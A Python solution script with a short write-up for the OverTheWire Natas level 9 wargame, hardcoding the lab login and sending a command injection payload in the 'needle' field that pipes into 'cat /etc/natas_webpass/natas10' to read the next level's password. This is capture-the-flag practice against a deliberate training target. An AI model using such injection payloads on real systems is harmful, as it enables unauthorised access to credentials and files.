#%%
import requests
import re
name = "natas9"

url = f"http://{name}.natas.labs.overthewire.org"
auth = (f"{name}","W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl")
payload='| echo -n "The password for natas10 is " && cat /etc/natas_webpass/natas10 && '
session = requests.session()
logon = session.post(url,auth=auth,data={'needle':payload})
regex = re.compile(r'The password for natas10 is ([\w\d]+)')
try:
    passwd = regex.findall(logon.text)[0]
    print(passwd)
except IndexError:
    ...
    
"""Natas 10

After viewing the source code I saw grep bash command looking like this
grep -i $key dictionary.txt, when $key is a value for "needle" key in request data,
So I needed to inject my bash script into that grep, I used pipes for that
The string that I injected in $key looked like this
"| echo -n "The password for natas10 is " && cat /etc/natas_webpass/natas10 && "
It is not the shortest solution but I wanted to get pretty output.

After injection grep line looked like this:
grep -i | echo -n "The password for natas10 is " && cat /etc/natas_webpass/natas10 &&  dictionary.txt
grep is doing basically nothing now, but cat is displaying content of natas10 file where the password is located
"""
